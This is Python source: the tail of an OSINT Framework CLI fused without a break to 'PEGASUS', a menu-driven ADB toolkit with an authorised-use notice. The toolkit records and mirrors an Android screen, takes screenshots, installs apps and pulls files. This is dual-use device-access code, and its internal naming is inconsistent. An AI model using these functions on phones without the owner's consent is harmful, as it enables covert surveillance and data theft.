# ─────────────────────────────────────────────────────────────────────────────

def cli():
    parser = argparse.ArgumentParser(
        description="OSINT Framework — Python CLI Replication",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent("""\
            Examples:
              python3 osint_framework.py
              python3 osint_framework.py --tree
              python3 osint_framework.py --query "email breach"
              python3 osint_framework.py --export json
              python3 osint_framework.py --export csv
              python3 osint_framework.py --list-categories
        """)
    )
    parser.add_argument("--tree",   action="store_true", help="Print the full OSINT Framework tree and exit.")
    parser.add_argument("--query",  metavar="TERM",       help="Search for tools matching TERM.")
    parser.add_argument("--export", choices=["json","csv"], help="Export framework data.")
    parser.add_argument("--list-categories", action="store_true", help="List all top-level categories.")
    args = parser.parse_args()

    if args.tree:
        show_full_tree()
        return
    if args.list_categories:
        banner()
        for i, cat in enumerate(FRAMEWORK, 1):
            print(f"  {i:2}. {cat}")
        return
    if args.query:
        banner()
        query_framework(args.query)
        return
    if args.export == "json":
        export_json()
        return
    if args.export == "csv":
        export_csv()
        return

    # Default: interactive
    main_menu()


if __name__ == "__main__":
    cli()#!/usr/bin/env python3
"""
PEGASUS  
============================================================
Developed by Vaishnav Rajeev | Contributions by Rishabh Gurnani

A terminal-based, ADB-driven toolkit for managing and diagnosing
Android devices from a Kali Linux (or any Linux) workstation.

IMPORTANT / ETHICAL USE NOTICE
-------------------------------
This tool is intended for devices you own, or devices you have
explicit, written authorization to test (e.g. as part of a mobile
security / forensics coursework exercise). Only use it against a
device that is already unlocked for debugging with the owner's
knowledge and consent. Do not use this tool on a device you do not
own or do not have permission to access.

Requirements
------------
- Python 3.8+
- Android platform-tools (adb) on your PATH
    sudo apt install android-tools-adb
- Optional: scrcpy, for the Screen Mirror feature
    sudo apt install scrcpy
- Optional: pyfiglet, for the banner (falls back to plain text)
    pip install pyfiglet
"""

import os
import sys
import time
import json
import shutil
import datetime
import subprocess

try:
    import pyfiglet
    HAVE_FIGLET = True
except ImportError:
    HAVE_FIGLET = False

APP_NAME = "PEGASUS"
APP_VERSION = "1.0"
DEVELOPER_LINE = "Developed by Vaishnav Rajeev | Contriubuted by Rishabh Gurnani"

HISTORY_FILE = os.path.join(os.path.expanduser("~"), ".aegisadb_history.json")
WORKDIR = os.path.join(os.path.expanduser("~"), "AegisADB_output")


# ------------------------------------------------------------------
# Colors
# ------------------------------------------------------------------
class Color:
    RESET = "\033[0m"
    BOLD = "\033[1m"
    DIM = "\033[2m"
    CYAN = "\033[96m"
    ORANGE = "\033[38;5;214m"
    GREEN = "\033[92m"
    RED = "\033[91m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"


# ------------------------------------------------------------------
# Utilities
# ------------------------------------------------------------------
def ensure_workdir():
    os.makedirs(WORKDIR, exist_ok=True)


def run_adb(args, timeout=30):
    """Run an adb command (args is the list of arguments after 'adb')."""
    cmd = ["adb"] + args
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return result.returncode, result.stdout.strip(), result.stderr.strip()
    except FileNotFoundError:
        return -1, "", "adb not found. Install it with: sudo apt install android-tools-adb"
    except subprocess.TimeoutExpired:
        return -1, "", "Command timed out."


def log_event(event, detail=""):
    ensure_workdir()
    entry = {
        "timestamp": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "event": event,
        "detail": detail,
    }
    history = []
    if os.path.exists(HISTORY_FILE):
        try:
            with open(HISTORY_FILE, "r") as f:
                history = json.load(f)
        except (json.JSONDecodeError, IOError):
            history = []
    history.append(entry)
    history = history[-200:]
    try:
        with open(HISTORY_FILE, "w") as f:
            json.dump(history, f, indent=2)
    except IOError:
        pass


def pause():
    input(f"\n{Color.DIM}Press Enter to return to the menu...{Color.RESET}")


def clear():
    os.system("clear" if os.name != "nt" else "cls")


def colorize_padded(text, width, color):
    """Pad on the plain text length first, then wrap in color codes,
    so ANSI escapes don't throw off column alignment."""
    pad = max(width - len(text), 2)
    return f"{color}{text}{Color.RESET}" + " " * pad


def banner():
    if HAVE_FIGLET:
        text = pyfiglet.figlet_format(APP_NAME, font="big")
    else:
        text = f"{APP_NAME}\n"
    print(f"{Color.CYAN}{Color.BOLD}{text}{Color.RESET}", end="")
    print(f"{Color.CYAN}{APP_NAME} v{APP_VERSION} | {DEVELOPER_LINE}{Color.RESET}")
    print(f"{Color.CYAN}Fly. Observe. Control. Android Operations{Color.RESET}")
    print(f"{Color.YELLOW}Use only on devices you own or are explicitly authorized to test. IT IS ILLEGAL TO USE NORMALLY!!!!!{Color.RESET}")
    print(f"{Color.BLUE}{'-' * 65}{Color.RESET}")


# ------------------------------------------------------------------
# Menu actions
# ------------------------------------------------------------------
def check_device():
    print(f"\n{Color.CYAN}[*] Checking connected devices...{Color.RESET}")
    code, out, err = run_adb(["devices", "-l"])
    if code != 0:
        print(f"{Color.RED}{err}{Color.RESET}")
        return
    print(out)
    lines = [l for l in out.splitlines() if l.strip() and "List of devices" not in l]
    if not lines:
        print(f"{Color.RED}No devices connected.{Color.RESET}")
        return
    _, model, _ = run_adb(["shell", "getprop", "ro.product.model"])
    _, manufacturer, _ = run_adb(["shell", "getprop", "ro.product.manufacturer"])
    _, android_ver, _ = run_adb(["shell", "getprop", "ro.build.version.release"])
    _, battery, _ = run_adb(["shell", "dumpsys", "battery"])
    print(f"\n{Color.GREEN}Manufacturer:{Color.RESET} {manufacturer}")
    print(f"{Color.GREEN}Model:{Color.RESET} {model}")
    print(f"{Color.GREEN}Android Version:{Color.RESET} {android_ver}")
    for line in battery.splitlines():
        if "level" in line.lower():
            print(f"{Color.GREEN}Battery:{Color.RESET} {line.strip()}")
    log_event("check_device", model)


def connect_device():
    print(f"\n{Color.CYAN}[*] Connect a device{Color.RESET}")
    print("  1. USB")
    print("  2. Wireless (IP:PORT)")
    choice = input("Select: ").strip()
    if choice == "2":
        addr = input("Enter device IP:PORT (e.g. 192.168.1.5:5555): ").strip()
        if not addr:
            print(f"{Color.RED}No address entered.{Color.RESET}")
            return
        code, out, err = run_adb(["connect", addr])
        print(out or err)
        log_event("connect_wireless", addr)
    else:
        print(f"{Color.YELLOW}Plug the device in via USB, enable USB debugging, "
              f"and accept the RSA authorization prompt on the phone.{Color.RESET}")
        code, out, err = run_adb(["devices"])
        print(out)
        log_event("connect_usb", out)


def disconnect_device():
    print(f"\n{Color.CYAN}[*] Disconnect device{Color.RESET}")
    addr = input("Enter IP:PORT to disconnect (leave blank to disconnect all): ").strip()
    args = ["disconnect"] + ([addr] if addr else [])
    code, out, err = run_adb(args)
    print(out or err or "Disconnected.")
    log_event("disconnect", addr or "all")


def screen_recording():
    duration = input("Recording duration in seconds (max 180) [10]: ").strip() or "10"
    if not duration.isdigit() or not (1 <= int(duration) <= 180):
        print(f"{Color.RED}Enter a number between 1 and 180.{Color.RESET}")
        return
    remote = "/sdcard/aegisadb_record.mp4"
    ensure_workdir()
    local = os.path.join(WORKDIR, f"screen_record_{int(time.time())}.mp4")
    print(f"{Color.CYAN}[*] Recording for {duration}s...{Color.RESET}")
    code, out, err = run_adb(
        ["shell", "screenrecord", f"--time-limit={duration}", remote],
        timeout=int(duration) + 15,
    )
    if code != 0:
        print(f"{Color.RED}{err}{Color.RESET}")
        return
    code, out, err = run_adb(["pull", remote, local])
    print(out or err)
    run_adb(["shell", "rm", remote])
    if os.path.exists(local):
        print(f"{Color.GREEN}Saved to {local}{Color.RESET}")
    log_event("screen_recording", local)


def screen_mirror():
    if shutil.which("scrcpy") is None:
        print(f"{Color.RED}scrcpy not found.{Color.RESET} Install it with: sudo apt install scrcpy")
        return
    print(f"{Color.CYAN}[*] Launching scrcpy... close its window to return here.{Color.RESET}")
    subprocess.run(["scrcpy"])
    log_event("screen_mirror")


def show_apk_list():
    print(f"\n{Color.CYAN}[*] Installed packages{Color.RESET}")
    mode = input("Show (1) all packages  (2) third-party only [2]: ").strip() or "2"
    args = ["shell", "pm", "list", "packages"]
    if mode == "2":
        args.append("-3")
    code, out, err = run_adb(args)
    print(out or err or "No packages found.")
    log_event("show_apk_list", "all" if mode == "1" else "third-party")


def take_screenshot():
    ensure_workdir()
    local = os.path.join(WORKDIR, f"screenshot_{int(time.time())}.png")
    try:
        with open(local, "wb") as f:
            subprocess.run(["adb", "exec-out", "screencap", "-p"], stdout=f, timeout=20, check=True)
        print(f"{Color.GREEN}Saved to {local}{Color.RESET}")
        log_event("screenshot", local)
    except FileNotFoundError:
        print(f"{Color.RED}adb not found.{Color.RESET}")
    except subprocess.CalledProcessError as e:
        print(f"{Color.RED}Screenshot failed (exit code {e.returncode}).{Color.RESET}")
    except subprocess.TimeoutExpired:
        print(f"{Color.RED}Timed out.{Color.RESET}")


def power_off():
    confirm = input(f"{Color.RED}This will power off the connected device. Continue? (y/N): {Color.RESET}").strip().lower()
    if confirm == "y":
        code, out, err = run_adb(["shell", "reboot", "-p"])
        print(out or err or "Power-off command sent.")
        log_event("power_off")


def install_apk():
    path = input("Path to .apk file: ").strip().strip('"')
    if not os.path.isfile(path):
        print(f"{Color.RED}File not found.{Color.RESET}")
        return
    code, out, err = run_adb(["install", "-r", path], timeout=90)
    print(out or err)
    log_event("install_apk", path)


def delete_apk():
    pkg = input("Package name to uninstall (e.g. com.example.app): ").strip()
    if not pkg:
        return
    confirm = input(f"Uninstall {pkg}? (y/N): ").strip().lower()
    if confirm == "y":
        code, out, err = run_adb(["uninstall", pkg])
        print(out or err)
        log_event("delete_apk", pkg)


def pull_file():
    remote = input("Remote path on device: ").strip()
    if not remote:
        return
    ensure_workdir()
    local = input(f"Local destination [{WORKDIR}]: ").strip() or WORKDIR
    code, out, err = run_adb(["pull", remote, local], timeout=90)
    print(out or err)
    log_event("pull_file", f"{remote} -> {local}")


def push_file():
    local = input("Local file path: ").strip().strip('"')
    if not os.path.isfile(local):
        print(f"{Color.RED}File not found.{Color.RESET}")
        return
    remote = input("Remote destination on device (e.g. /sdcard/): ").strip()
    if not remote:
        return
    code, out, err = run_adb(["push", local, remote], timeout=90)
    print(out or err)
    log_event("push_file", f"{local} -> {remote}")


def reboot_device():
    confirm = input("Reboot the device? (y/N): ").strip().lower()
    if confirm == "y":
        code, out, err = run_adb(["reboot"])
        print(out or err or "Reboot command sent.")
        log_event("reboot")


def start_app():
    pkg = input("Package name to launch (e.g. com.android.settings): ").strip()
    if not pkg:
        return
    code, out, err = run_adb(["shell", "monkey", "-p", pkg, "-c", "android.intent.category.LAUNCHER", "1"])
    print(out or err)
    log_event("start_app", pkg)


def get_device_logs():
    ensure_workdir()
    local = os.path.join(WORKDIR, f"logcat_{int(time.time())}.txt")
    print(f"{Color.CYAN}[*] Dumping current log buffer...{Color.RESET}")
    code, out, err = run_adb(["logcat", "-d"], timeout=30)
    if code != 0:
        print(f"{Color.RED}{err}{Color.RESET}")
        return
    with open(local, "w") as f:
        f.write(out)
    print(f"{Color.GREEN}Saved to {local} ({len(out.splitlines())} lines){Color.RESET}")
    log_event("get_logs", local)


def toggle_wifi():
    state = input("Turn Wi-Fi (1) ON or (2) OFF: ").strip()
    if state not in ("1", "2"):
        print(f"{Color.RED}Invalid choice.{Color.RESET}")
        return
    arg = "enable" if state == "1" else "disable"
    code, out, err = run_adb(["shell", "svc", "wifi", arg])
    print(out or err or f"Wi-Fi {arg} command sent.")
    log_event("toggle_wifi", arg)


def check_storage():
    code, out, err = run_adb(["shell", "df", "/data"])
    print(out or err)
    log_event("check_storage")


def troubleshoot_connection():
    print(f"\n{Color.CYAN}[*] Running diagnostics...{Color.RESET}")
    adb_path = shutil.which("adb")
    code, out, err = run_adb(["devices"])
    checks = [
        ("adb installed on PATH", bool(adb_path)),
        ("adb server responding", code == 0),
        ("at least one device listed", "device" in out.replace("List of devices attached", "")),
    ]
    for name, ok in checks:
        status = f"{Color.GREEN}OK{Color.RESET}" if ok else f"{Color.RED}FAIL{Color.RESET}"
        print(f"  [{status}] {name}")
    retry = input("\nRestart the adb server? (y/N): ").strip().lower()
    if retry == "y":
        run_adb(["kill-server"])
        run_adb(["start-server"])
        code, out, err = run_adb(["devices"])
        print(out)
    log_event("troubleshoot")


def view_history():
    if not os.path.exists(HISTORY_FILE):
        print(f"{Color.YELLOW}No connection history yet.{Color.RESET}")
        return
    with open(HISTORY_FILE, "r") as f:
        try:
            history = json.load(f)
        except json.JSONDecodeError:
            history = []
    if not history:
        print(f"{Color.YELLOW}No connection history yet.{Color.RESET}")
        return
    print(f"\n{Color.CYAN}Recent activity (most recent last):{Color.RESET}")
    for entry in history[-20:]:
        print(f"  {Color.DIM}{entry['timestamp']}{Color.RESET}  "
              f"{Color.ORANGE}{entry['event']}{Color.RESET}  {entry.get('detail', '')}")


# ------------------------------------------------------------------
# Menu
# ------------------------------------------------------------------
MENU_ITEMS = [
    ("1", "Check Device", check_device),
    ("2", "Connect a Device", connect_device),
    ("3", "Disconnect Device", disconnect_device),
    ("4", "Screen Recording", screen_recording),
    ("5", "Screen Mirror", screen_mirror),
    ("6", "Show APK List", show_apk_list),
    ("7", "Take Screenshot", take_screenshot),
    ("8", "Power Off", power_off),
    ("9", "Install APK", install_apk),
    ("10", "Delete APK", delete_apk),
    ("11", "Pull File", pull_file),
    ("12", "Push File", push_file),
    ("13", "Reboot Device", reboot_device),
    ("14", "Start App", start_app),
    ("15", "Get Device Logs", get_device_logs),
    ("16", "Toggle Wi-Fi", toggle_wifi),
    ("17", "Check Storage", check_storage),
    ("18", "Troubleshoot Connection", troubleshoot_connection),
    ("19", "View Connection History", view_history),
]


def print_menu():
    print()
    for i in range(0, len(MENU_ITEMS), 3):
        row = MENU_ITEMS[i:i + 3]
        line = ""
        for num, label, _ in row:
            plain = f"[{num}] {label}"
            line += colorize_padded(plain, 26, Color.ORANGE)
        print(line)
    print(f"\n{Color.GREEN}[q] Quit{Color.RESET}")
    print(f"{Color.BLUE}{'-' * 65}{Color.RESET}")


def main():
    actions = {num: fn for num, _, fn in MENU_ITEMS}
    while True:
        clear()
        banner()
        print_menu()
        choice = input(f"\n{Color.GREEN}Select an option (1-19) or q to quit: {Color.RESET}").strip().lower()
        if choice == "q":
            print(f"{Color.CYAN}Goodbye.{Color.RESET}")
            break
        fn = actions.get(choice)
        if fn is None:
            print(f"{Color.RED}Invalid option.{Color.RESET}")
            pause()
            continue
        try:
            fn()
        except KeyboardInterrupt:
            print(f"\n{Color.YELLOW}Cancelled.{Color.RESET}")
        except Exception as e:
            print(f"{Color.RED}Error: {e}{Color.RESET}")
        pause()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Color.CYAN}Goodbye.{Color.RESET}")
        sys.exit(0)
